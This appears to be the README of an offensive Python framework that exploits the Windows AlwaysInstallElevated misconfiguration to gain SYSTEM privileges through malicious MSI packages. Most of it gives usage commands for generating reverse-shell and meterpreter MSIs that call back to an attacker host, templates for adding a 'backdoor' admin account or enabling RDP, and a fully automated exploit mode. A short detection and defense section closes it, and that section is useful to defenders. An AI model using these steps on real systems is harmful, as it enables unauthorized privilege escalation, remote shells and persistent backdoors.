# AlwaysInstallElevated Exploitation Framework

A modular Python framework for detecting and exploiting the AlwaysInstallElevated Windows misconfiguration for privilege escalation via malicious MSI packages.

## ⚠️ Legal Disclaimer

This tool is intended for authorized penetration testing and educational purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

## Overview

The AlwaysInstallElevated policy allows non-privileged users to install MSI packages with SYSTEM privileges. When both registry keys are set to 1, any MSI package will be installed with elevated permissions.

**Required Registry Keys (Both must be set to 1):**
```
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
```

## Directory Structure

```
alwaysinstallelevated_framework/
├── __init__.py              # Package initialization
├── aie_exploit.py           # Main CLI entry point
├── README.md                # This file
│
├── core/                    # Core functionality
│   ├── __init__.py
│   ├── base.py              # Abstract base class
│   ├── checker.py           # Registry vulnerability detection
│   └── exploiter.py         # MSI installation/exploitation
│
├── payloads/                # Payload generation
│   ├── __init__.py
│   ├── msfvenom.py          # Msfvenom MSI generation
│   └── wix.py               # WiX Toolset MSI templates
│
├── utils/                   # Utility functions
│   ├── __init__.py
│   ├── constants.py         # Error codes, registry paths
│   └── helpers.py           # Helper utilities
│
└── output/                  # Generated payloads and logs
```

## Installation

```bash
# Clone or copy the framework
git clone <repo> alwaysinstallelevated_framework
cd alwaysinstallelevated_framework

# No additional dependencies required (uses standard library)
# Optional: Install msfvenom for payload generation
# Optional: Install WiX Toolset for custom MSI creation
```

## Quick Start

### Check Vulnerability

```bash
python aie_exploit.py --check
```

### Generate Payloads

```bash
# Msfvenom reverse shell MSI
python aie_exploit.py --generate msfvenom --lhost 192.168.1.100 --lport 4444

# Msfvenom meterpreter MSI
python aie_exploit.py --generate msfvenom --type meterpreter --lhost 192.168.1.100 --lport 4444

# WiX add-user template
python aie_exploit.py --generate wix --type add_user --username backdoor --password Secret123!

# WiX reverse shell template
python aie_exploit.py --generate wix --type reverse_shell --lhost 192.168.1.100 --lport 4444

# WiX enable RDP template
python aie_exploit.py --generate wix --type enable_rdp
```

### Exploit

```bash
# Install malicious MSI
python aie_exploit.py --exploit /path/to/malicious.msi

# Skip vulnerability check
python aie_exploit.py --exploit /path/to/malicious.msi --no-verify
```

### Fully Automated

```bash
# Auto check -> generate -> exploit
python aie_exploit.py --auto --lhost 192.168.1.100 --lport 4444
```

## Module Usage

### As a Library

```python
from rt_alwaysinstallelevated_framework import (
    RegistryChecker,
    MSIExploiter,
    MsfvenomPayload,
    WixPayload
)

# Check if vulnerable
checker = RegistryChecker()
if checker.is_vulnerable():
    print("System is vulnerable!")
    
    # Generate payload
    generator = MsfvenomPayload()
    msi_path = generator.generate_reverse_shell("192.168.1.100", 4444)
    
    # Exploit
    exploiter = MSIExploiter()
    success, msg = exploiter.exploit(msi_path)
```

## Payload Types

### Msfvenom Payloads

| Type | Description | Options |
|------|-------------|---------|
| reverse_shell | TCP reverse shell | --lhost, --lport |
| meterpreter | Meterpreter session | --lhost, --lport |
| exec | Execute command | --command |

### WiX Payloads

| Type | Description | Options |
|------|-------------|---------|
| add_user | Create admin user | --username, --password |
| reverse_shell | PowerShell reverse shell | --lhost, --lport |
| enable_rdp | Enable RDP + create user | --username, --password |
| custom | Run any command | --command |

## Compiling WiX Templates

WiX Toolset is required to compile .wxs templates to .msi files:

```bash
# Install WiX Toolset from https://wixtoolset.org/

# Compile WiX source
candle.exe payload.wxs

# Link to create MSI
light.exe payload.wixobj -o payload.msi
```

## MSI Error Codes

| Code | Meaning |
|------|---------|
| 0 | Success |
| 1603 | Fatal error during installation |
| 1618 | Another installation in progress |
| 1619 | Package could not be opened |
| 3010 | Restart required |

## Detection

Check for AlwaysInstallElevated with:

```cmd
# Manual check
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# PowerShell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
```

## Defense Recommendations

1. **Disable AlwaysInstallElevated** - Set both registry values to 0 or delete them
2. **Use Group Policy** - Configure "Always install with elevated privileges" to Disabled
3. **Monitor MSI installations** - Log and alert on msiexec.exe activity
4. **Application Whitelisting** - Restrict which MSI packages can be installed
5. **Least Privilege** - Don't grant users local admin rights

## References

- [MITRE ATT&CK - Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002/)
- [PayloadsAllTheThings - AlwaysInstallElevated](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [WiX Toolset Documentation](https://wixtoolset.org/documentation/)

## License

For educational and authorized testing purposes only.